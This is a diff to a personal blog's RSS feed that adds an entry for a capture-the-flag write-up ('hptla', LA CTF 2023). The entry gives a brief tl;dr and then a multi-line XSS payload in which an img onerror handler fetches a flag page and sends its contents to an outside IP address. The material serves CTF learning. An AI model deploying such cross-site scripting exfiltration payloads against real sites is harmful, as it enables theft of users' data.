@@ -5,6 +5,39 @@
         <description>All Posts | My Blog</description>
         <generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>rohitnanu.m@gmail.com (Rohit)</managingEditor>
             <webMaster>rohitnanu.m@gmail.com (Rohit)</webMaster><lastBuildDate>Wed, 15 Feb 2023 00:00:00 &#43;0530</lastBuildDate><atom:link href="http://r0h1t.me/blog/posts/" rel="self" type="application/rss+xml" /><item>
+    <title>hptla - LA CTF 2023</title>
+    <link>http://r0h1t.me/blog/posts/hptla/</link>
+    <pubDate>Wed, 15 Feb 2023 00:00:00 &#43;0530</pubDate><author>
+                    <name>Rohit</name>
+                </author><guid>http://r0h1t.me/blog/posts/hptla/</guid>
+    <description><![CDATA[<h4 id="tldr" class="headerLink">
+    <a href="#tldr" class="header-mark"></a>tl;dr</h4><ul>
+<li>We can join the two lines either by adding a ` or starting a comment <code>/*</code> at the end of one line and closing it <code>*\</code> at the start of the next line</li>
+<li>We have to split the payload into 20 parts like that</li>
+</ul>
+<p>Final payload</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s">&#39;</span><span class="na">onerror</span><span class="o">=</span><span class="s">&#39;`
+</span></span></span><span class="line"><span class="cl"><span class="s">`;n=fetch;`
+</span></span></span><span class="line"><span class="cl"><span class="s">`;l=r=&gt;{`
+</span></span></span><span class="line"><span class="cl"><span class="s">`;return/*
+</span></span></span><span class="line"><span class="cl"><span class="s">*/r.text();`
+</span></span></span><span class="line"><span class="cl"><span class="s">`;};`
+</span></span></span><span class="line"><span class="cl"><span class="s">`;p=q=&gt;{s=/*
+</span></span></span><span class="line"><span class="cl"><span class="s">*/`http:`;`
+</span></span></span><span class="line"><span class="cl"><span class="s">`;s+=`//3`;`
+</span></span></span><span class="line"><span class="cl"><span class="s">`;s+=`4.9`;`
+</span></span></span><span class="line"><span class="cl"><span class="s">`;s+=`3.5`;`
+</span></span></span><span class="line"><span class="cl"><span class="s">`;window./*
+</span></span></span><span class="line"><span class="cl"><span class="s">*/location/*
+</span></span></span><span class="line"><span class="cl"><span class="s">*/=s+`6.144?
+</span></span></span><span class="line"><span class="cl"><span class="s">`+q;};`
+</span></span></span><span class="line"><span class="cl"><span class="s">`;f=`flag`;`
+</span></span></span><span class="line"><span class="cl"><span class="s">`;w=n(f)/*
+</span></span></span><span class="line"><span class="cl"><span class="s">*/.then(l)/*
+</span></span></span><span class="line"><span class="cl"><span class="s">*/.then(p);&#39;</span>
+</span></span></code></pre></div>]]></description>
+</item><item>
     <title>queue up - LA CTF 2023</title>
     <link>http://r0h1t.me/blog/posts/queue-up/</link>
     <pubDate>Wed, 15 Feb 2023 00:00:00 &#43;0530</pubDate><author>
